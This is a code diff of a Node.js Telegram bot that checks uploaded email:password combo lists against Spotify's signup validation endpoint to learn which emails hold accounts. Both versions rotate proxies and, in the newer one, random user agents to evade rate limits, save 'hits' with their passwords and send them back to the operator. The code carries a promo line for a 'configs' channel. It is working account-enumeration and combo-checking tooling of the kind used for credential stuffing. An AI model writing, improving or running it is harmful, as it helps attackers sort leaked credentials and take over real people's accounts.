@@ -1,378 +1,298 @@
-const { Telegraf, Markup } = require('telegraf');
-const axios = require('axios');
-const { SocksProxyAgent } = require('socks-proxy-agent');
-const { HttpProxyAgent } = require('http-proxy-agent');
+require('dotenv').config();
 const fs = require('fs');
-const path = require('path');
+const https = require('https');
+const { Telegraf, Markup } = require('telegraf');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const { randomUA } = require('./ua-helper');
+
+// ⚙️ CONFIGURATION
+const CONFIG = {
+  API_URL: 'https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email=',
+  OUTPUT_FILE: 'Spotify VM.txt',
+  CONTACT_NOTE: 'FOR MORE CONFIGS : t.me/mrcombo1services',
+  SUCCESS_KEYS: [
+    'Ese correo electrónico ya está registrado en una cuenta.',
+    'That email is already registered to an account',
+    'Cette adresse e-mail est déjà associée à un compte.'
+  ],
+  FAILURE_KEY: '"status":1',
+  CONCURRENCY: 5,
+  TIMEOUT: 15000,
+  MAX_RETRIES: 2,
+  BOT_TOKEN: process.env.BOT_TOKEN,
+  OWNER_ID: process.env.OWNER_ID ? parseInt(process.env.OWNER_ID) : null
+};
+
+// 🚫 Simple Auth — only YOU can use the bot
+function isOwner(userId) {
+  return CONFIG.OWNER_ID === null || userId === CONFIG.OWNER_ID;
+}
+
+// Global State
+let proxies = [];
+let bannedProxies = new Set();
+let stats = { total: 0, checked: 0, hits: 0, available: 0, errors: 0 };
+let isRunning = false;
+let currentChatId = null;
+
+// ─────────────────────────────────────────────────────────────────────
+// PROXY & EMAIL CHECKER
+// ─────────────────────────────────────────────────────────────────────
+function loadProxies(path = 'proxies.txt') {
+  if (!fs.existsSync(path)) return [];
+  return fs.readFileSync(path, 'utf8')
+    .split(/\r?\n/)
+    .map(l => l.trim())
+    .filter(l => l);
+}
+
+function getAvailableProxy() {
+  const available = proxies.filter(p => !bannedProxies.has(p));
+  return available.length ? available[Math.floor(Math.random() * available.length)] : null;
+}
+
+async function checkEmail(email, password = '') {
+  const proxy = getAvailableProxy();
+  const url = `${CONFIG.API_URL}${encodeURIComponent(email)}`;
+  const ua = randomUA();
+
+  const options = {
+    headers: {
+      'Accept': '*/*',
+      'Pragma': 'no-cache',
+      'User-Agent': ua
+    },
+    timeout: CONFIG.TIMEOUT,
+    rejectUnauthorized: true
+  };
+  if (proxy) options.agent = new HttpsProxyAgent(proxy);
+
+  return new Promise((resolve) => {
+    const req = https.get(url, options, (res) => {
+      let body = '';
+      res.on('data', chunk => body += chunk);
+      res.on('end', () => {
+        let type = 'AVAILABLE';
+        for (const key of CONFIG.SUCCESS_KEYS) {
+          if (body.includes(key)) { type = 'EXISTS'; break; }
+        }
+        resolve({ email, password, proxy, type, statusCode: res.statusCode });
+      });
+    });
+    req.on('error', () => {
+      if (proxy) bannedProxies.add(proxy);
+      resolve({ email, password, proxy, type: 'ERROR' });
+    });
+    req.end();
+  });
+}
+
+function saveHit(email, password) {
+  fs.appendFileSync(CONFIG.OUTPUT_FILE, `${email}:${password || ''}\n`, 'utf8');
+}
+
+async function processList(entries, chatId) {
+  isRunning = true;
+  stats = { total: entries.length, checked: 0, hits: 0, available: 0, errors: 0 };
+  
+  await bot.telegram.sendMessage(chatId, 
+    `🚀 Starting check — ${CONFIG.CONTACT_NOTE}\n` +
+    `📋 Total: ${entries.length} | 🔄 Threads: ${CONFIG.CONCURRENCY} | 🕵️ Proxies: ${proxies.length}`
+  );
+
+  const queue = [...entries];
+  const workers = [];
+
+  for (let i = 0; i < CONFIG.CONCURRENCY; i++) {
+    workers.push((async () => {
+      while (queue.length > 0 && isRunning) {
+        const item = queue.shift();
+        if (!item) break;
+        const [email, password = ''] = item.split(':');
+        const result = await checkEmail(email, password);
+        
+        stats.checked++;
+        if (result.type === 'EXISTS') {
+          stats.hits++;
+          saveHit(email, password);
+          await bot.telegram.sendMessage(chatId, 
+            `✅ EXISTS: ${email}\n🔑 Pass: ${password || 'N/A'}\n🕵️ Proxy: ${result.proxy || 'Direct'}`,
+            { parse_mode: 'Markdown' }
+          );
+        } else if (result.type === 'AVAILABLE') {
+          stats.available++;
+        } else {
+          stats.errors++;
+        }
+        
+        if (stats.checked % 20 === 0) {
+          const pct = ((stats.checked / stats.total) * 100).toFixed(1);
+          await bot.telegram.sendMessage(chatId, 
+            `📊 Progress: ${stats.checked}/${stats.total} (${pct}%)\n` +
+            `✅ Hits: ${stats.hits} | ❌ Avail: ${stats.available} | ⚠️ Errors: ${stats.errors}`
+          );
+        }
+      }
+    })());
+  }
+
+  await Promise.all(workers);
+  isRunning = false;
+  
+  await bot.telegram.sendMessage(chatId, 
+    `🏁 FINISHED!\n` +
+    `📊 Total: ${stats.total}\n✅ Hits: ${stats.hits}\n❌ Available: ${stats.available}\n⚠️ Errors: ${stats.errors}\n` +
+    `📂 Saved to: ${CONFIG.OUTPUT_FILE}\n\n${CONFIG.CONTACT_NOTE}`,
+    { parse_mode: 'Markdown' }
+  );
+}
+
+// ─────────────────────────────────────────────────────────────────────
+// TELEGRAM BOT SETUP
+// ─────────────────────────────────────────────────────────────────────
+const bot = new Telegraf(CONFIG.BOT_TOKEN);
+
+// Auth Middleware
+bot.use((ctx, next) => {
+  if (!isOwner(ctx.from.id)) {
+    return ctx.reply('❌ Unauthorized — This bot is private');
+  }
+  return next();
+});
+
+bot.command('start', (ctx) => {
+  ctx.replyWithMarkdown(`
+🎵 *Spotify VM Bot* — ${CONFIG.CONTACT_NOTE}
+
+*Commands:*
+/upload - Upload wordlist (.txt, one email:pass per line)
+/proxies - Upload proxy list
+/startcheck - Start checking
+/stop - Stop running check
+/stats - Show current stats
+/download - Download results file
+/status - Show bot status
+
+*How to use:*
+1. Send /upload and attach your wordlist
+2. Send /proxies and attach proxies (optional)
+3. Type /startcheck to begin
+4. Use /stop anytime to pause
+  `);
+});
+
+bot.command('stop', (ctx) => {
+  isRunning = false;
+  ctx.reply('🛑 Stopping check...');
+});
+
+bot.command('stats', (ctx) => {
+  ctx.replyWithMarkdown(`
+📊 *Current Stats:*
+Checked: ${stats.checked}/${stats.total}
+Hits: ${stats.hits}
+Available: ${stats.available}
+Errors: ${stats.errors}
+Running: ${isRunning ? '✅ Yes' : '❌ No'}
+Proxies loaded: ${proxies.length}
+  `);
+});
+
+bot.command('status', (ctx) => {
+  ctx.replyWithMarkdown(`
+🤖 *Bot Status:*
+Running: ${isRunning ? '🟢 Active' : '🔴 Idle'}
+Proxies: ${proxies.length}
+Banned proxies: ${bannedProxies.size}
+Output file: ${CONFIG.OUTPUT_FILE}
+  `);
+});
+
+bot.command('download', async (ctx) => {
+  if (!fs.existsSync(CONFIG.OUTPUT_FILE)) {
+    return ctx.reply('⚠️ No results file found yet. Run a check first!');
+  }
+  await ctx.replyWithDocument({
+    source: CONFIG.OUTPUT_FILE,
+    filename: `Spotify_Results_${Date.now()}.txt`
+  });
+});
+
+// Handle Wordlist Upload
+bot.on('document', async (ctx, next) => {
+  const doc = ctx.message.document;
+  const fileExt = doc.file_name?.split('.').pop()?.toLowerCase();
+  
+  if (fileExt !== 'txt') {
+    return ctx.reply('⚠️ Please upload a .txt file');
+  }
+
+  const fileLink = await ctx.telegram.getFileLink(doc.file_id);
+  const res = await fetch(fileLink.href);
+  const text = await res.text();
+  const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l);
+
+  if (doc.file_name.toLowerCase().includes('prox') || doc.file_name === 'proxies.txt') {
+    fs.writeFileSync('proxies.txt', lines.join('\n'));
+    proxies = loadProxies();
+    bannedProxies.clear();
+    ctx.reply(`✅ Loaded ${proxies.length} proxies`);
+  } else {
+    fs.writeFileSync('mail.txt', lines.join('\n'));
+    ctx.reply(`✅ Wordlist saved — ${lines.length} entries`);
+  }
+});
+
+bot.command('upload', (ctx) => {
+  ctx.reply('📄 Send your wordlist file as attachment (.txt)\nFormat: email:password per line');
+});
+
+bot.command('proxies', (ctx) => {
+  ctx.reply('🕵️ Send your proxy list (.txt)\nFormat: http://user:pass@host:port or http://host:port');
+});
+
+bot.command('startcheck', async (ctx) => {
+  if (isRunning) return ctx.reply('⚠️ Already running — use /stop first');
+  
+  const wordlistPath = 'mail.txt';
+  if (!fs.existsSync(wordlistPath)) {
+    return ctx.reply('⚠️ No wordlist found — use /upload first');
+  }
+  
+  proxies = loadProxies();
+  const entries = fs.readFileSync(wordlistPath, 'utf8')
+    .split(/\r?\n/)
+    .map(l => l.trim())
+    .filter(l => l);
+  
+  if (!entries.length) return ctx.reply('⚠️ Wordlist is empty');
+  
+  currentChatId = ctx.chat.id;
+  await processList(entries, ctx.chat.id);
+});
+
+// Health check endpoint for Render
 const express = require('express');
-
-// ==============================================
-// CONFIGURATION
-// ==============================================
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const API_KEY = 'a1e486e2729f46d6bb368d6b2bcda326';
-
-const CONCURRENCY = 1;
-const MAX_RETRIES = 1;
-const TIMEOUT = 15000;
-const BATCH_DELAY = 2000;
-
 const app = express();
 const PORT = process.env.PORT || 10000;
-app.get('/', (req, res) => res.send('✅ Spotify Checker Bot is Running!'));
-app.listen(PORT, () => console.log(`🌐 Keepalive server on port ${PORT}`));
 
-const bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 600000 });
-
-const headers = {
-  'authority': 'spclient.wg.spotify.com',
-  'accept': '*/*',
-  'content-type': 'application/json',
-  'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-};
-
-const clientInfo = {
-  api_key: API_KEY,
-  app_version: 'v2',
-  capabilities: [1],
-  installation_id: 'f3bb4c40-89f4-45b6-a3d6-0d22dd486182',
-  platform: 'www',
-};
-
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-function parseProxy(proxyStr) {
-  proxyStr = proxyStr.trim();
-  if (!proxyStr) return null;
-  let type = 'http';
-  let host, port, username, password;
-  if (proxyStr.includes('://')) {
-    const [proto, rest] = proxyStr.split('://');
-    type = proto.toLowerCase();
-    if (rest.includes('@')) {
-      const [auth, hp] = rest.split('@');
-      [username, password] = auth.split(':');
-      [host, port] = hp.split(':');
-    } else {
-      [host, port] = rest.split(':');
-    }
-  } else {
-    const parts = proxyStr.split(':');
-    if (parts.length === 4) {
-      [host, port, username, password] = parts;
-    } else if (parts.length === 2) {
-      [host, port] = parts;
-    }
-  }
-  if (!host || !port) return null;
-  return { type, host: host.trim(), port: parseInt(port), username, password };
-}
-
-function createProxyAgent(proxy) {
-  if (!proxy) return null;
-  const { type, host, port, username, password } = proxy;
-  const auth = username && password ? `${username}:${password}@` : '';
-  const uri = `${type}://${auth}${host}:${port}`;
-  if (type === 'socks4' || type === 'socks5') {
-    return new SocksProxyAgent(uri);
-  }
-  return new HttpProxyAgent(uri);
-}
-
-class ProxyRotator {
-  constructor(proxies) {
-    this.proxies = proxies.filter(p => p !== null);
-    this.index = 0;
-    this.stats = { total: this.proxies.length, working: 0, failed: 0 };
-  }
-  next() {
-    if (this.proxies.length === 0) return null;
-    const proxy = this.proxies[this.index % this.proxies.length];
-    this.index++;
-    return proxy;
-  }
-  markWorking() { this.stats.working++; }
-  markFailed() { this.stats.failed++; }
-}
-
-async function checkEmail(email, proxyRotator, useProxy = true) {
-  const jsonData = {
-    fields: [{ field: 'FIELD_EMAIL', value: email.trim() }],
-    client_info: clientInfo,
-    tracking: { creation_point: 'https://open.spotify.com/artist/59YhsSefd7itecSNMp0Nv8' },
-  };
-  for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
-    const proxy = useProxy ? proxyRotator.next() : null;
-    const agent = proxy ? createProxyAgent(proxy) : null;
-    try {
-      const res = await axios.post(
-        'https://spclient.wg.spotify.com/signup/public/v2/account/validate',
-        jsonData,
-        {
-          headers,
-          timeout: TIMEOUT,
-          httpAgent: agent?.httpAgent,
-          httpsAgent: agent?.httpsAgent || agent,
-        }
-      );
-      if (proxy) proxyRotator.markWorking();
-      const resJson = res.data;
-      console.log(`✅ Checked: ${email} | Status: ${resJson.error || 'OK'} | Proxy: ${proxy?.host || 'direct'}`);
-      if (resJson.error && String(resJson.error).includes('already_exists')) {
-        return { status: 'VALID', item: email, proxy: proxy?.host || 'direct' };
-      } else if (resJson.success) {
-        return { status: 'DEAD', item: email, proxy: proxy?.host || 'direct' };
-      }
-      return { status: 'UNKNOWN', item: email, proxy: proxy?.host || 'direct' };
-    } catch (err) {
-      console.log(`🔍 Failed: ${email} | Error: ${err.code || err.message} | Proxy: ${proxy?.host || 'direct'}`);
-      if (proxy) proxyRotator.markFailed();
-      if (err.response?.status === 429) {
-        console.log(`⚠️ Rate limited — waiting 3s`);
-        await sleep(3000);
-        continue;
-      }
-      if (attempt === MAX_RETRIES) {
-        return { status: 'ERROR', item: email, error: err.code || err.message, proxy: proxy?.host || 'direct' };
-      }
-      await sleep(1000);
-    }
-  }
-  return { status: 'ERROR', item: email, error: 'Max retries exceeded', proxy: proxy?.host || 'direct' };
-}
-
-const userState = new Map();
-
-bot.start((ctx) => {
-  try {
-    ctx.reply(
-      `👋 Welcome to Spotify Checker Bot!\n\n📌 Choose a mode below:`,
-      Markup.inlineKeyboard([
-        [Markup.button.callback('📧 Check Emails Only', 'mode_emails')],
-        [Markup.button.callback('🔐 Check Combos (email:pass)', 'mode_combo')],
-        [Markup.button.callback('🧪 Test Direct (no proxy)', 'mode_no_proxy')]
-      ])
-    );
-  } catch (e) { console.error('Start error:', e.message); }
+app.get('/', (req, res) => {
+  res.send('Spotify VM Bot is running 🎵 — Check Telegram!');
 });
 
-bot.action('mode_emails', (ctx) => {
-  userState.set(ctx.chat.id, { mode: 'emails', items: [], proxies: [], useProxies: true, stage: 'awaiting_items' });
-  ctx.answerCbQuery();
-  ctx.reply('📧 **Email-Only Mode**\n📂 Send your .txt file — one email per line:', { parse_mode: 'Markdown' });
+app.get('/health', (req, res) => {
+  res.json({ status: 'ok', running: isRunning, hits: stats.hits });
 });
 
-bot.action('mode_combo', (ctx) => {
-  userState.set(ctx.chat.id, { mode: 'combo', items: [], proxies: [], useProxies: true, stage: 'awaiting_items' });
-  ctx.answerCbQuery();
-  ctx.reply('🔐 **Combo Mode**\n📂 Send your .txt file — email:password per line:', { parse_mode: 'Markdown' });
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`🌐 Health check on port ${PORT}`);
 });
 
-bot.action('mode_no_proxy', (ctx) => {
-  userState.set(ctx.chat.id, { mode: 'emails', items: [], proxies: [], useProxies: false, stage: 'awaiting_items' });
-  ctx.answerCbQuery();
-  ctx.reply('🧪 **Test Mode — No Proxies**\n📂 Send a SMALL test list first (5–10 emails):', { parse_mode: 'Markdown' });
-});
+// Start Bot
+bot.launch({ polling: true })
+  .then(() => console.log('🤖 Telegram Bot Started'))
+  .catch(err => console.error('Bot error:', err));
 
-bot.command('mode', (ctx) => {
-  ctx.reply('🔄 Choose your mode:',
-    Markup.inlineKeyboard([
-      [Markup.button.callback('📧 Check Emails Only', 'mode_emails')],
-      [Markup.button.callback('🔐 Check Combos', 'mode_combo')],
-      [Markup.button.callback('🧪 Test No Proxy', 'mode_no_proxy')]
-    ])
-  );
-});
-
-bot.help((ctx) => {
-  ctx.reply(`📖 **How to Use:**
-1. /start — Choose mode
-2. Upload your list file
-3. If using proxies — upload proxy file next
-4. Bot starts automatically!
-
-📌 **Tip:** Start with 5–10 items to test first
-
-⚡ Concurrency: ${CONCURRENCY} | Timeout: ${TIMEOUT}ms
-Made by: @PLANECLOUD | @DK_CE`, { parse_mode: 'Markdown' });
-});
-
-async function startChecking(ctx, state, proxyRotator = null) {
-  const total = state.items.length;
-  const results = { valid: [], dead: [], unknown: [], errors: [] };
-  let checked = 0;
-
-  const progressMsg = await ctx.reply(
-    `⏳ Progress: 0/${total} (0%)\n\n` +
-    `🟢 𝗟𝗶𝘃𝗲: 0\n` +
-    `🔴 𝗗𝗲𝗮𝗱: 0\n` +
-    `🟡 𝗨𝗻𝗸𝗻𝗼𝘄𝗻: 0\n` +
-    `🔵 𝗘𝗿𝗿𝗼𝗿𝘀: 0`
-  );
-
-  const updateMessage = async () => {
-    const percent = Math.round((checked / total) * 100);
-    try {
-      let extra = '';
-      if (proxyRotator) {
-        extra = `\n🌐 Proxies OK: ${proxyRotator.stats.working} | Failed: ${proxyRotator.stats.failed}`;
-      }
-      await ctx.telegram.editMessageText(
-        ctx.chat.id,
-        progressMsg.message_id,
-        undefined,
-        `⏳ 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: ${checked}/${total} (${percent}%)\n\n` +
-        `🟢 𝗟𝗶𝘃𝗲: ${results.valid.length}\n` +
-        `🔴 𝗗𝗲𝗮𝗱: ${results.dead.length}\n` +
-        `🟡 𝗨𝗻𝗸𝗻𝗼𝘄𝗻: ${results.unknown.length}\n` +
-        `🔵 𝗘𝗿𝗿𝗼𝗿𝘀: ${results.errors.length}${extra}`
-      );
-    } catch (e) {}
-  };
-
-  for (let i = 0; i < state.items.length; i += CONCURRENCY) {
-    const batch = state.items.slice(i, i + CONCURRENCY);
-    const promises = batch.map(async (item) => {
-      const email = state.mode === 'combo' ? item.split(':')[0].trim() : item;
-      const result = await checkEmail(email, proxyRotator, state.useProxies);
-      if (state.mode === 'combo' && result.item) {
-        const fullCombo = state.items.find(s => s.startsWith(result.item + ':'));
-        if (fullCombo) result.item = fullCombo;
-      }
-      return result;
-    });
-
-    const batchResults = await Promise.all(promises);
-    batchResults.forEach(r => {
-      if (r.status === 'VALID') results.valid.push(r.item);
-      else if (r.status === 'DEAD') results.dead.push(r.item);
-      else if (r.status === 'UNKNOWN') results.unknown.push(r.item);
-      else results.errors.push(`${r.item} — ${r.error}`);
-    });
-
-    checked += batch.length;
-    await updateMessage();
-    await sleep(BATCH_DELAY);
-  }
-
-  let proxyInfo = '';
-  if (proxyRotator) {
-    proxyInfo = `🌐 𝗣𝗿𝗼𝘅𝗶𝗲𝘀: ${proxyRotator.stats.total} total | ${proxyRotator.stats.working} used | ${proxyRotator.stats.failed} failed\n\n`;
-  }
-
-  const summary =
-    `✅ ✅ 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅ ✅\n\n` +
-    `📊 𝗧𝗼𝘁𝗮𝗹: ${total}\n` +
-    `🟢 𝗟𝗶𝘃𝗲: ${results.valid.length}\n` +
-    `🔴 𝗗𝗲𝗮𝗱: ${results.dead.length}\n` +
-    `🟡 𝗨𝗻𝗸𝗻𝗼𝘄𝗻: ${results.unknown.length}\n` +
-    `🔵 𝗘𝗿𝗿𝗼𝗿𝘀: ${results.errors.length}\n\n` +
-    proxyInfo +
-    `Made by: @PLANECLOUD | @DK_CE`;
-
-  await ctx.reply(summary);
-
-  const outputPath = path.join(__dirname, 'outputs');
-  if (!fs.existsSync(outputPath)) fs.mkdirSync(outputPath);
-
-  fs.writeFileSync(path.join(outputPath, 'live.txt'), results.valid.join('\n'));
-  fs.writeFileSync(path.join(outputPath, 'dead.txt'), results.dead.join('\n'));
-  fs.writeFileSync(path.join(outputPath, 'unknown.txt'), results.unknown.join('\n'));
-  fs.writeFileSync(path.join(outputPath, 'errors.txt'), results.errors.join('\n'));
-  fs.writeFileSync(path.join(outputPath, 'full_results.txt'),
-    `=== 𝗟𝗜𝗩𝗘 (${results.valid.length}) ===\n${results.valid.join('\n')}\n\n` +
-    `=== 𝗗𝗘𝗔𝗗 (${results.dead.length}) ===\n${results.dead.join('\n')}\n\n` +
-    `=== 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 (${results.unknown.length}) ===\n${results.unknown.join('\n')}\n\n` +
-    `=== 𝗘𝗥𝗥𝗢𝗥𝗦 (${results.errors.length}) ===\n${results.errors.join('\n')}`
-  );
-
-  await ctx.replyWithDocument({ source: path.join(outputPath, 'live.txt'), filename: 'live.txt' });
-  await ctx.replyWithDocument({ source: path.join(outputPath, 'dead.txt'), filename: 'dead.txt' });
-  await ctx.replyWithDocument({ source: path.join(outputPath, 'unknown.txt'), filename: 'unknown.txt' });
-  await ctx.replyWithDocument({ source: path.join(outputPath, 'errors.txt'), filename: 'errors.txt' });
-  await ctx.replyWithDocument({ source: path.join(outputPath, 'full_results.txt'), filename: 'full_results.txt' });
-  await ctx.reply('📤 All results sent! ✅');
-
-  fs.rmSync(outputPath, { recursive: true, force: true });
-  userState.delete(ctx.chat.id);
-}
-
-bot.on('document', async (ctx) => {
-  try {
-    const file = ctx.message.document;
-    if (!file.file_name.endsWith('.txt')) {
-      return ctx.reply('⚠️ Please send only **.txt files!**', { parse_mode: 'Markdown' });
-    }
-    const state = userState.get(ctx.chat.id);
-    if (!state) return ctx.reply('⚠️ Please run /start first!');
-
-    const fileLink = await ctx.telegram.getFileLink(file.file_id);
-    const res = await axios.get(fileLink.href, { responseType: 'text', timeout: 30000 });
-    const lines = res.data.split('\n').map(l => l.trim()).filter(l => l);
-
-    if (state.stage === 'awaiting_items') {
-      let validItems = [];
-      if (state.mode === 'emails') {
-        validItems = lines.filter(l => l.includes('@'));
-        if (validItems.length === 0) return ctx.reply('❌ No valid emails found!');
-      } else {
-        validItems = lines.filter(l => l.includes(':'));
-        if (validItems.length === 0) return ctx.reply('❌ No valid combos found!');
-      }
-      state.items = validItems;
-
-      if (!state.useProxies) {
-        state.proxies = [];
-        state.stage = 'ready';
-        userState.set(ctx.chat.id, state);
-        await ctx.reply(`✅ Loaded: **${validItems.length} items**\n🧪 Running DIRECT check...`, { parse_mode: 'Markdown' });
-        await startChecking(ctx, state);
-        return;
-      }
-
-      state.stage = 'awaiting_proxies';
-      userState.set(ctx.chat.id, state);
-      return ctx.reply(
-        `✅ Received: **${file.file_name}** — ${validItems.length} items loaded!\n\n🌐 Now send your **proxy list** (.txt)`,
-        { parse_mode: 'Markdown' }
-      );
-    }
-
-    if (state.stage === 'awaiting_proxies') {
-      const proxies = lines.map(parseProxy).filter(p => p !== null);
-      if (proxies.length === 0) return ctx.reply('❌ No valid proxies found! Check format.');
-      const proxyRotator = new ProxyRotator(proxies);
-      state.proxyRotator = proxyRotator;
-      state.stage = 'ready';
-      userState.set(ctx.chat.id, state);
-      await ctx.reply(
-        `🚀 **Starting Checker!**\n📥 Items: ${state.items.length}\n🌐 Proxies: ${proxyRotator.stats.total}\n⚡ Concurrency: ${CONCURRENCY}`,
-        { parse_mode: 'Markdown' }
-      );
-      await startChecking(ctx, state, proxyRotator);
-    }
-  } catch (err) {
-    console.error('❌ Document error:', err.message);
-    await ctx.reply(`⚠️ Error: ${err.message}`);
-  }
-});
-
-bot.catch((err, ctx) => {
-  console.error('❌ Bot error:', err.message);
-});
-
-async function startBot() {
-  try {
-    console.log('🔄 Connecting to Telegram...');
-    await bot.launch();
-    console.log('✅ Bot is running! Check Telegram!');
-  } catch (err) {
-    console.error('❌ Failed to start:', err.message);
-    process.exit(1);
-  }
-}
-
-startBot();
-
+// Graceful Shutdown
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
